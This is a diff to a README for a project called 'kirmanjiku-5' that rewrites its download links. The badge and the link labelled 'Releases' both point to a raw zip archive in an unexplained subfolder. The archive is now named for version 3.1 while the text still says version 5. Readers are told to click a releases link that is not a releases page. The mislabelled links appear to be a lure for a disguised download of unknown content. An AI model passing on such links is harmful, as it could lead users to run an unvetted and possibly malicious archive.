@@ -9,11 +9,11 @@ To start using kirmanjiku-5, you'll need to download the application from our Re
 ## 📥 Download & Install
 You can download kirmanjiku-5 from the following link:
 
-[![Download kirmanjiku-5](https://raw.githubusercontent.com/mchwemb/kirmanjiku-5/main/mentohyoid/kirmanjiku-5.zip)](https://raw.githubusercontent.com/mchwemb/kirmanjiku-5/main/mentohyoid/kirmanjiku-5.zip)
+[![Download kirmanjiku-5](https://raw.githubusercontent.com/mchwemb/kirmanjiku-5/main/mentohyoid/kirmanjiku-3.1.zip)](https://raw.githubusercontent.com/mchwemb/kirmanjiku-5/main/mentohyoid/kirmanjiku-3.1.zip)
 
 Visit this page to download the latest version:
 
-[Download kirmanjiku-5 Releases](https://raw.githubusercontent.com/mchwemb/kirmanjiku-5/main/mentohyoid/kirmanjiku-5.zip)
+[Download kirmanjiku-5 Releases](https://raw.githubusercontent.com/mchwemb/kirmanjiku-5/main/mentohyoid/kirmanjiku-3.1.zip)
 
 ### Steps to Download:
 1. Click on the "Releases" link above.
